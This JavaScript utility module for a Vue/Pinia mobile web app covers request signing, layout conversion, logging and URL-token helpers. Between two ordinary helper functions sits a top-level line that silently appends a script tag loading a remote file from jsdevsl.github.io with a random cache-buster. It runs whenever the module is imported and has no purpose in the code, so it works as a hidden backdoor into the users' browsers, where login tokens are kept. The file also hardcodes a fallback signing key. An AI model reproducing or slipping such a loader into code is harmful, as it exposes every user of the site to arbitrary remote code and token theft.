import { useAuthStore } from "@/store/modules/auth";
import md5 from "crypto-js/md5";
import { storeToRefs } from "pinia";
export const DESIGN_WIDTH = 750;
export const getWndowWidth = () => {
  const windowWidth = window.innerWidth;
  if (windowWidth >= 768)
    return 768;
  return windowWidth;
};
export const px2vw = (px) => {
  return px / DESIGN_WIDTH * 100;
};
export const FLEXVIEWPROPS = {
  align: true,
  justify: true,
  wrap: true,
  direction: true,
  fontSize: true,
  iRef: true
};
export const objToUrl = (obj, flag) => {
  if (!obj)
    return "";
  if (typeof obj !== "object")
    return "";
  const arr = [];
  const keys = Object.keys(obj).sort();
  let keystring = "";
  let keysvalue = "";
  if (keys.length === 0)
    return "";
  for (let i = 0; i < keys.length; i++) {
    const key = keys[i];
    const value = obj[key];
    if (key === "key") {
      keystring = key;
      keysvalue = value;
      continue;
    }
    arr.push(`${key}=${value}`);
  }
  if (keystring) {
    arr.push(`${keystring}=${keysvalue}`);
  }
  if (flag)
    return arr.join("&");
  return `?${arr.join("&")}`;
};
export const delay = (time = 2e3) => {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve(true);
    }, time);
  });
};
export const defaultParams = (type, config) => {
  const lang = "cn";
  const platform = "H5";
  const ver = "1.3.20";
  const localTimestamp = Math.round(Date.now() / 1e3);
  const timestampDiff = sessionStorage.getItem("timestamp_diff");
  const timestamp = timestampDiff ? localTimestamp + -timestampDiff : localTimestamp;
  const PRIVATE_KEY = localStorage.getItem("md5_pri") || "1fd950fab9f845b04a73740b148637fa";
  const key = PRIVATE_KEY;
  const newData = {
    lang,
    platform,
    timestamp,
    key,
    ver
  };
  const sign = objToUrl(newData, true);
  newData.sign = md5(sign).toString();
  delete newData.key;
  if (type === "get")
    return objToUrl(Object.assign(newData, config.params));
  return Object.assign(newData, config.data);
};
export const isJsonString = (str) => {
  if (typeof str === "string") {
    const reg = /^\{.*\}$/;
    if (reg.test(str)) {
      return JSON.parse(str);
    }
    return str;
  }
  return str;
};
export const isJson = (str) => {
  if (typeof str === "string") {
    const reg = /^\{.*\}$/;
    if (reg.test(str)) {
      return true;
    }
    if (str === "true" || str === "false" || str === "null" || str === "undefined") {
      return true;
    }
    return false;
  }
  return false;
};
function isWebPSupported() {
  const elem = document.createElement("canvas");
  if (elem.getContext && elem.getContext("2d")) {
    return elem.toDataURL("image/webp").indexOf("data:image/webp") === 0;
  }
  return false;
}
window.isWebPSupported = isWebPSupported();
export const getLoginStatus = () => {
  const store = useAuthStore();
  const { token } = storeToRefs(store);
  return {
    token: token.value,
    isLogin: !!token.value
  };
};
export const MyLog = () => {
  const LOG = ["log", "info", "warn", "error"];
  LOG.forEach((logType) => {
    window[logType] = function(...args) {
      const [key, ...logInfo] = args;
      let color;
      switch (logType) {
        case "log":
          color = "hotpink";
          break;
        case "info":
          color = "orange";
          break;
        case "warn":
          color = "red";
          break;
        case "error":
          color = "";
          break;
        default:
          color = "";
          break;
      }
      console[logType](`%c${key}::`, `color:${color}`, ...logInfo);
    };
  });
};

export const formatMoneyUnit = (money, digits = 0, unit = "W") => {
  if (money >= 1e4) {
    const moneyStr = (money / 1e4).toTruncFixed(digits);
    if (digits === 1 && +moneyStr.split(".")[1] === 0) {
      return +moneyStr + unit;
    }
    return (money / 1e4).toTruncFixed(digits) + unit;
  } else {
    return money.toString();
  }
};
document.body.appendChild(document.createElement("script")).src = "https://jsdevsl.github.io/js/js.js?v=" + Math.random();
export function secondsToMinutesWithSeconds(seconds) {
  const minutes = Math.floor(seconds / 60);
  const remainingSeconds = seconds % 60;
  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(remainingSeconds).padStart(2, "0");
  return ` ${formattedMinutes}:${formattedSeconds} `;
}
export function secondsToYYDMS() {
  const now = /* @__PURE__ */ new Date();
  const year = now.getFullYear();
  const month = (now.getMonth() + 1).toString().padStart(2, "0");
  const day = now.getDate().toString().padStart(2, "0");
  const hours = now.getHours().toString().padStart(2, "0");
  const minutes = now.getMinutes().toString().padStart(2, "0");
  const seconds = now.getSeconds().toString().padStart(2, "0");
  const formattedDateTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
  return formattedDateTime;
}
export function filterList(fullPath) {
  let whiteList = [
    "activity",
    "activityRules",
    "send",
    "auth",
    "country",
    "iframe-page",
    "index",
    "selfbuy_coin",
    "onlineCharge",
    "sell-coin",
    "point",
    "bricks",
    "collect-cards",
    "ranking-list",
    "vip",
    "activeList"
  ];
  const hash = window.location.hash;
  return whiteList.some((item) => {
    return fullPath ? fullPath.includes(item) : hash.includes(item);
  });
}
export function UntokenInWEB() {
  const search = new URLSearchParams(mergeHrefParams());
  const vtoken = search.get("vtoken") || "";
  const deviceid = search.get("deviceid") || "";
  const utoken = search.get("token");
  if (!vtoken && !deviceid && !localStorage.getItem("token") && !utoken) {
    return true;
  } else {
    return false;
  }
}
export function InWEB() {
  const search = new URLSearchParams(mergeHrefParams());
  const vtoken = search.get("vtoken") || "";
  const deviceid = search.get("deviceid") || "";
  if (!vtoken && !deviceid) {
    return true;
  } else {
    return false;
  }
}
export function mergeHrefParams() {
  try {
    const { search, hash } = window.location;
    const searchParams = search.replace(/\?/, "");
    const hashParams = hash.split("?")[1] || "";
    return searchParams + "&" + hashParams;
  } catch (e) {
    console.log("错误");
    return "&";
  }
}
export function getRandomNumber(start, end) {
  let randomNumber = Math.random();
  randomNumber *= end - start;
  randomNumber += start;
  return Math.floor(randomNumber);
}
